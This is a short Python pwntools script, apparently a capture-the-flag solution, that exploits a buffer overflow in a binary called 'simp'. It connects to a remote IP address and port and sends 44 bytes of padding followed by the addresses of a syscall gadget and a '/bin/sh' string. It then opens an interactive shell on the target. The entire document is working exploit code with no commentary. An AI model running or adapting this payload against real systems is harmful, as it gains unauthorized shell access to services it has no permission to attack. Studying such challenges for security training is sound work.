# coding: utf-8
from pwn import *
#p = process("./simp")
p = remote("207.154.239.148", 1995)
syscall = 0x080491f4
binsh = 0x0804a008
payload = b"A"*44 + p32(syscall) + p32(binsh)
p.sendline(payload)
p.interactive()
